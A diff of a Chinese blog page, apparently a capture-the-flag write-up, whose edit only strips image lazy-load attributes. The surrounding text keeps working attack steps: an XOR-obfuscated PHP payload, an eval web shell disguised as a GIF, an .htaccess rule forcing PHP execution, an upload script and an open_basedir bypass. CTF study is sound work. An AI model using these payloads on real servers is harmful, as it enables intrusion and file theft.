@@ -307,7 +307,7 @@ print(T,end=&quot;\n&quot;)</code></pre>
 <p>这个师傅写的特别的详细，点赞！</p>
 <p>所以最后的payload:</p>
 <pre><code class="php">_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=phpinfo</code></pre>
-<p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" srcset="/img/loading.gif" alt="执行payload">执行payload</a></p>
+<p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" alt="执行payload">执行payload</a></p>
 <p>然后就是第二关了，我们可以看到源码里有一个<code>get_the_flag</code>函数，我们需要利用这个函数来上传一个shell，这个文件需要满足的要求是</p>
 <ul>
 <li>文件扩展名中不能出现<code>ph</code></li>
@@ -323,8 +323,8 @@ print(T,end=&quot;\n&quot;)</code></pre>
 </ul>
 <pre><code class="php">shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)</code></pre>
 <p>这里面的<code>\x00\x00\x47\x49\x46\x38\x39\x61</code>-&gt;<code>GIF89a</code>是GIF头，<code>b&quot;00&quot;</code>的作用：用来分割头和php代码。目的是防止之后解密base64解密的时候造成错误。</p>
-<p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" srcset="/img/loading.gif" alt="shell源码">shell源码</a></p>
-<p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" srcset="/img/loading.gif" alt="base64解密">base64解密</a></p>
+<p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" alt="shell源码">shell源码</a></p>
+<p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" alt="base64解密">base64解密</a></p>
 <p>但是单单上传一个这个文件是不行的，所以我们需要<code>.htaccess</code>文件来帮助我们让服务器把这个文件解析成php代码，我们才能够真真的利用。</p>
 <pre><code class="python">htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61
 AddType application/x-httpd-php .aaa
@@ -354,11 +354,11 @@ files = {&#39;file&#39;: (&#39;shell.aaa&#39;, shell, &#39;image/gif&#39;)}
 
 r = requests.post(url + payload, files=files)
 print(r.text)</code></pre>
-<p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" srcset="/img/loading.gif" alt="操作过程">操作过程</a></p>
+<p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" alt="操作过程">操作过程</a></p>
 <p>但是有了shell，会发现可以读到当前目录下的文件，但是无法读到根目录下面的flag。</p>
 <p>因为这里还需要绕过<code>open_basedir</code>这里直接给payload了，可以跟着这个<a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">师傅的教程</a>动手做一下实验</p>
-<pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" srcset="/img/loading.gif" alt="读根目录文件">读根目录文件</a></p>
-<p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" srcset="/img/loading.gif" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>
+<pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" alt="读根目录文件">读根目录文件</a></p>
+<p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
